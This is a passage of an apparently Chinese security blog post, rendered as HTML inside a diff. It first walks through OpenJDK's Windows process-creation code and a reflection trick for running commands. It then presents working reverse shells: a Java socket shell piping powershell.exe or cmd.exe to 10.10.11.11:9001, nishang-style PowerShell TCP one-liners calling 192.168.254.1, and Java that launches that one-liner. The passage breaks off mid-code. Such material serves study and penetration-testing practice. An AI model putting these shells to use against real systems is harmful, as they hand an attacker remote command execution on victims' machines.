class="hljs-keyword">if</span> (!(*env)-&gt;<span class="hljs-built_in">ExceptionCheck</span>(env)) &#123;<br>                <span class="hljs-type">const</span> jchar *pdir = (dir != <span class="hljs-literal">NULL</span>)<br>                    ? (*env)-&gt;<span class="hljs-built_in">GetStringChars</span>(env, dir, <span class="hljs-literal">NULL</span>)<br>                    : <span class="hljs-literal">NULL</span>;<br>                <span class="hljs-keyword">if</span> (!(*env)-&gt;<span class="hljs-built_in">ExceptionCheck</span>(env)) &#123;<br>                    jlong *handles = (*env)-&gt;<span class="hljs-built_in">GetLongArrayElements</span>(env, stdHandles, <span class="hljs-literal">NULL</span>);<br>                    <span class="hljs-keyword">if</span> (handles != <span class="hljs-literal">NULL</span>) &#123;<br>                        ret = <span class="hljs-built_in">processCreate</span>(<br>                            env,<br>                            pcmd,<br>                            penvBlock,<br>                            pdir,<br>                            handles,<br>                            redirectErrorStream);<br>                        (*env)-&gt;<span class="hljs-built_in">ReleaseLongArrayElements</span>(env, stdHandles, handles, <span class="hljs-number">0</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (pdir != <span class="hljs-literal">NULL</span>)<br>                        (*env)-&gt;<span class="hljs-built_in">ReleaseStringChars</span>(env, dir, pdir);<br>                &#125;<br>                <span class="hljs-keyword">if</span> (penvBlock != <span class="hljs-literal">NULL</span>)<br>                    (*env)-&gt;<span class="hljs-built_in">ReleaseStringChars</span>(env, envBlock, penvBlock);<br>            &#125;<br>            (*env)-&gt;<span class="hljs-built_in">ReleaseStringChars</span>(env, cmd, pcmd);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/unofficial-openjdk/openjdk/blob/e59bd5b27066bb2eb77828110ee585b1598ba636/src/java.base/windows/native/libjava/ProcessImpl_md.c#L266">processCreate</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> jlong <span class="hljs-title">processCreate</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    JNIEnv *env,</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> jchar *pcmd,</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> jchar *penvBlock,</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> jchar *pdir,</span></span><br><span class="hljs-params"><span class="hljs-function">    jlong *handles,</span></span><br><span class="hljs-params"><span class="hljs-function">    jboolean redirectErrorStream)</span></span><br><span class="hljs-function"></span>&#123;<br>    jlong ret = <span class="hljs-number">0L</span>;<br>    STARTUPINFOW si = &#123;<span class="hljs-built_in">sizeof</span>(si)&#125;;<br><br>    <span class="hljs-comment">/* Handles for which the inheritance flag must be restored. */</span><br>    HANDLE stdIOE[HANDLE_STORAGE_SIZE] = &#123;<br>        <span class="hljs-comment">/* Current process standard IOE handles: JDK-7147084 */</span><br>        INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE,<br>        <span class="hljs-comment">/* Child process IOE handles: JDK-6921885 */</span><br>        (HANDLE)handles[<span class="hljs-number">0</span>], (HANDLE)handles[<span class="hljs-number">1</span>], (HANDLE)handles[<span class="hljs-number">2</span>]&#125;;<br>    BOOL inherit[HANDLE_STORAGE_SIZE] = &#123;<br>        FALSE, FALSE, FALSE,<br>        FALSE, FALSE, FALSE&#125;;<br><br>    <span class="hljs-comment">/* These three should not be closed by CloseHandle! */</span><br>    stdIOE[<span class="hljs-number">0</span>] = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);<br>    stdIOE[<span class="hljs-number">1</span>] = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);<br>    stdIOE[<span class="hljs-number">2</span>] = <span class="hljs-built_in">GetStdHandle</span>(STD_ERROR_HANDLE);<br><br>    <span class="hljs-built_in">prepareIOEHandleState</span>(stdIOE, inherit);<br>    &#123;<br>        <span class="hljs-comment">/* Input */</span><br>        STDHOLDER holderIn = &#123;&#123;INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE&#125;, OFFSET_READ&#125;;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">initHolder</span>(env, &amp;handles[<span class="hljs-number">0</span>], &amp;holderIn, &amp;si.hStdInput)) &#123;<br><br>            <span class="hljs-comment">/* Output */</span><br>            STDHOLDER holderOut = &#123;&#123;INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE&#125;, OFFSET_WRITE&#125;;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">initHolder</span>(env, &amp;handles[<span class="hljs-number">1</span>], &amp;holderOut, &amp;si.hStdOutput)) &#123;<br><br>                <span class="hljs-comment">/* Error */</span><br>                STDHOLDER holderErr = &#123;&#123;INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE&#125;, OFFSET_WRITE&#125;;<br>                BOOL success;<br>                <span class="hljs-keyword">if</span> (redirectErrorStream) &#123;<br>                    si.hStdError = si.hStdOutput;<br>                    <span class="hljs-comment">/* Here we set the error stream to [ProcessBuilder.NullInputStream.INSTANCE]</span><br><span class="hljs-comment">                       value. That is in accordance with Java Doc for the redirection case.</span><br><span class="hljs-comment">                       The Java file for the [ handles[2] ] will be closed in ANY case. It is not</span><br><span class="hljs-comment">                       a handle leak. */</span><br>                    handles[<span class="hljs-number">2</span>] = JAVA_INVALID_HANDLE_VALUE;<br>                    success = TRUE;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    success = <span class="hljs-built_in">initHolder</span>(env, &amp;handles[<span class="hljs-number">2</span>], &amp;holderErr, &amp;si.hStdError);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (success) &#123;<br>                    PROCESS_INFORMATION pi;<br>                    DWORD processFlag = CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT;<br><br>                    <span class="hljs-comment">/* If the standard I/O is inherited, CREATE_NO_WINDOW must not be used. */</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetConsoleWindow</span>() != <span class="hljs-literal">NULL</span> &amp;&amp;<br>                        (si.hStdInput  == stdIOE[<span class="hljs-number">0</span>] ||<br>                         si.hStdOutput == stdIOE[<span class="hljs-number">1</span>] ||<br>                         si.hStdError  == (redirectErrorStream ? stdIOE[<span class="hljs-number">1</span>] : stdIOE[<span class="hljs-number">2</span>])))<br>                    &#123;<br>                        processFlag &amp;= ~CREATE_NO_WINDOW;<br>                    &#125;<br><br>                    si.dwFlags = STARTF_USESTDHANDLES;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreateProcessW</span>(<br>                        <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* executable name */</span><br>                        (LPWSTR)pcmd,     <span class="hljs-comment">/* command line */</span><br>                        <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* process security attribute */</span><br>                        <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* thread security attribute */</span><br>                        TRUE,             <span class="hljs-comment">/* inherits system handles */</span><br>                        processFlag,      <span class="hljs-comment">/* selected based on exe type */</span><br>                        (LPVOID)penvBlock,<span class="hljs-comment">/* environment block */</span><br>                        (LPCWSTR)pdir,    <span class="hljs-comment">/* change to the new current directory */</span><br>                        &amp;si,              <span class="hljs-comment">/* (in)  startup information */</span><br>                        &amp;pi))             <span class="hljs-comment">/* (out) process information */</span><br>                    &#123;<br>                        <span class="hljs-built_in">win32Error</span>(env, <span class="hljs-string">L&quot;CreateProcess&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-built_in">closeSafely</span>(pi.hThread);<br>                        ret = (jlong)pi.hProcess;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-built_in">releaseHolder</span>(ret == <span class="hljs-number">0</span>, &amp;holderErr);<br>                <span class="hljs-built_in">releaseHolder</span>(ret == <span class="hljs-number">0</span>, &amp;holderOut);<br>            &#125;<br>            <span class="hljs-built_in">releaseHolder</span>(ret == <span class="hljs-number">0</span>, &amp;holderIn);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">restoreIOEHandleState</span>(stdIOE, inherit);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在其中调用了 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw">CreateProcessW 函数（processthreadsapi.h） - Win32 apps | Microsoft Learn</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">CreateProcessW</span>(<br>    <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* executable name */</span><br>    (LPWSTR)pcmd,     <span class="hljs-comment">/* command line */</span><br>    <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* process security attribute */</span><br>    <span class="hljs-literal">NULL</span>,             <span class="hljs-comment">/* thread security attribute */</span><br>    TRUE,             <span class="hljs-comment">/* inherits system handles */</span><br>    processFlag,      <span class="hljs-comment">/* selected based on exe type */</span><br>    (LPVOID)penvBlock,<span class="hljs-comment">/* environment block */</span><br>    (LPCWSTR)pdir,    <span class="hljs-comment">/* change to the new current directory */</span><br>    &amp;si,              <span class="hljs-comment">/* (in)  startup information */</span><br>    &amp;pi))             <span class="hljs-comment">/* (out) process information */</span><br></code></pre></td></tr></table></figure>
+
+<p>到这里 windows 就开始执行我们传入的命令了</p>
+<p>返回句柄</p>
+<ul>
+<li><code>handle</code> (<code>1820</code>) 是一个指向 <strong>新创建的子进程本身</strong> 的句柄，允许父进程管理和控制子进程的生命周期。</li>
+</ul>
+<ul>
+<li><code>stdHandles</code> 数组中的句柄 (<code>1832, 1836, 1844</code>) 是与子进程进行 <strong>输入&#x2F;输出通信</strong> 的管道&#x2F;文件句柄。（stdin, stdout, stderr）</li>
+</ul>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730142526350.png" srcset="/img/loading.gif" lazyload alt="image-20250730142526350"></p>
+<p>也就是在 windows 平台真正执行命令的方法就是 <code>java.lang.ProcessImpl#create</code> 这个 native 方法</p>
+<p>调用站</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">create:</span><span class="hljs-number">593</span>, ProcessImpl (java.lang)<br>&lt;init&gt;:<span class="hljs-number">453</span>, ProcessImpl (java.lang)<br><span class="hljs-symbol">start:</span><span class="hljs-number">139</span>, ProcessImpl (java.lang)<br><span class="hljs-symbol">start:</span><span class="hljs-number">1029</span>, ProcessBuilder (java.lang)<br><span class="hljs-symbol">exec:</span><span class="hljs-number">621</span>, Runtime (java.lang)<br><span class="hljs-symbol">exec:</span><span class="hljs-number">451</span>, Runtime (java.lang)<br><span class="hljs-symbol">exec:</span><span class="hljs-number">348</span>, Runtime (java.lang)<br><span class="hljs-symbol">main:</span><span class="hljs-number">8</span>, ExecTest (<span class="hljs-keyword">com</span>.lingx5.windows)<br></code></pre></td></tr></table></figure>
+
+<p>做个测试，通过反射拿到 ProcessImpl 拿到他的 Class 文件，利用他的构造方法来执行命令</p>
+<blockquote>
+<p>因为 create 方法，只有构造方法调用了，且 ProcessImpl 这个类只有一个构造方法，所以我们就不能通过无参构造器拿到类后，再执行 create 了</p>
+<center>
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250730145156033.png" srcset="/img/loading.gif" lazyload alt="image-20250730145156033" style="zoom: 67%;" />
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250730145239345.png" srcset="/img/loading.gif" lazyload alt="image-20250730145239345" style="zoom:50%;" />
+</center></blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">createTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        System.out.println(aClass);<br>        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(String[].class, String.class,<br>                String.class,<br>                <span class="hljs-type">long</span>[].class, <span class="hljs-type">boolean</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        constructor.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">long</span>[]&#123;-<span class="hljs-number">1L</span>,-<span class="hljs-number">1L</span>,-<span class="hljs-number">1L</span>&#125;, <span class="hljs-literal">false</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过 ProcessImpl 的构造方法成功执行命令</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250730145507620.png" srcset="/img/loading.gif" lazyload alt="image-20250730145507620" style="zoom: 50%;" />
+
+<h3 id="linux-平台"><a href="#linux-平台" class="headerlink" title="linux 平台"></a>linux 平台</h3><p>其实和 window 差不多，最后都是通过 native 方法(linux 是 forkAndExec() 方法)，实现命令执行的，详细可以参考：<a target="_blank" rel="noopener" href="https://www.javasec.org/javase/CommandExecution/">Java 本地命令执行</a></p>
+<p>调用栈</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:<span class="hljs-number">247</span>)<br>java.lang.ProcessImpl.start(ProcessImpl.java:<span class="hljs-number">134</span>)<br>java.lang.ProcessBuilder.start(ProcessBuilder.java:<span class="hljs-number">1029</span>)<br>java.lang.Runtime.exec(Runtime.java:<span class="hljs-number">620</span>)<br>java.lang.Runtime.exec(Runtime.java:<span class="hljs-number">450</span>)<br>java.lang.Runtime.exec(Runtime.java:<span class="hljs-number">347</span>)<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/unofficial-openjdk/openjdk/blob/e59bd5b27066bb2eb77828110ee585b1598ba636/src/java.base/unix/native/libjava/ProcessImpl_md.c#L579">navtive forkAndExec 源码</a></p>
+<h2 id="windows-revShell"><a href="#windows-revShell" class="headerlink" title="windows revShell"></a>windows revShell</h2><p>java 在 windows 下反弹 shell 比较通用的就是建立 socket 连接来实现 cmd，powershell 进程的 <code>I/O 重定向</code> ，还有就是命令本身的 <code>I/O 重定向</code></p>
+<h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>JavaSocketRevShell</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaSocketRevShell</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pumpStream</span><span class="hljs-params">(InputStream in, OutputStream out)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">int</span> bytesRead;<br>                <span class="hljs-keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                    out.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>                    out.flush();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in.close();<br>                    out.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException ignored) &#123;&#125;<br>            &#125;<br>        &#125;).start();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">conn</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port, String... cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(host, port)) &#123;<br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> pb.start();<br>            pumpStream(socket.getInputStream(), process.getOutputStream());<br>            pumpStream(process.getInputStream(), socket.getOutputStream());<br>            pumpStream(process.getErrorStream(), socket.getOutputStream());<br>            process.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaSocketRevShell</span>().conn(<span class="hljs-string">&quot;10.10.11.11&quot;</span>, <span class="hljs-number">9001</span>, <span class="hljs-string">&quot;powershell.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功反弹</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730174911904.png" srcset="/img/loading.gif" lazyload alt="image-20250730174911904"></p>
+<p>弹 cmd 的 shell 的话，要在后面加上 <code>/k</code> 参数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaSocketRevShell</span>().conn(<span class="hljs-string">&quot;10.10.11.11&quot;</span>, <span class="hljs-number">9001</span>, <span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/k&quot;</span>)<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>也可以反弹回来</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730174848114.png" srcset="/img/loading.gif" lazyload alt="image-20250730174848114"></p>
+<h3 id="powershell-命令"><a href="#powershell-命令" class="headerlink" title="powershell 命令"></a>powershell 命令</h3><p>powershell 这个 shell 环境也很强大，可以使用 powershell 脚本，其中具有可以重定向输入输出的命令，详见 <a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/tree/master">nishang</a> 框架 ：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">nishang&#x2F;Shells&#x2F;Invoke-PowerShellTcpOneLine.ps1 at master · samratashok&#x2F;nishang</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&#x27;192.168.254.1&#x27;</span>,<span class="hljs-number">4444</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&#x27;PS &#x27;</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">&#x27;&gt; &#x27;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$sm</span>=(<span class="hljs-built_in">New-Object</span> Net.Sockets.TCPClient(<span class="hljs-string">&#x27;192.168.254.1&#x27;</span>,<span class="hljs-number">55555</span>)).GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bt</span>=<span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span>=<span class="hljs-variable">$sm</span>.Read(<span class="hljs-variable">$bt</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$bt</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$d</span>=(<span class="hljs-built_in">New-Object</span> Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bt</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$i</span>);<span class="hljs-variable">$st</span>=([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes((<span class="hljs-built_in">iex</span> <span class="hljs-variable">$d</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>));<span class="hljs-variable">$sm</span>.Write(<span class="hljs-variable">$st</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$st</span>.Length)&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对应 java 代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecRevShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27;10.10。11.11&#x27;&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">9001</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$client = New-Object System.Net.Sockets.TCPClient(&quot;</span>+ip+<span class="hljs-string">&quot;,&quot;</span>+port+<span class="hljs-string">&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span>;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;powershell.exe &quot;</span>+cmd);<br>    